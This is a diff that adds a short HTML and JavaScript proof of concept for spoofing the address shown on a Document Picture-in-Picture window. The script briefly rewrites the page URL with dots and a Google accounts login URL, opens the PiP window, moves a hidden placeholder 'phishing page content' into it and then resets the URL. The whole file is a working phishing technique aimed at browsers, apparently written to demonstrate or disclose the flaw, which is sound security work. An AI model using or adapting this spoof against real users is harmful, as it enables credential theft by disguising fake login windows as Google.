@@ -1,0 +1,30 @@
+<style>
+    #content {
+        display: none;
+    }
+</style>
+
+<button id="button">Open PIP</button>
+
+<div id="content">
+    phishing page content here
+</div>
+
+<script>
+    const pipOpen = async () => {
+        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
+
+        const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 330,
+            height: 317
+        });
+        
+        setTimeout(() => {
+            history.replaceState(null, '', '/');
+        }, 1000);
+
+        pipWindow.document.body.append(content);
+    };
+
+    button.onclick = pipOpen;
+</script>
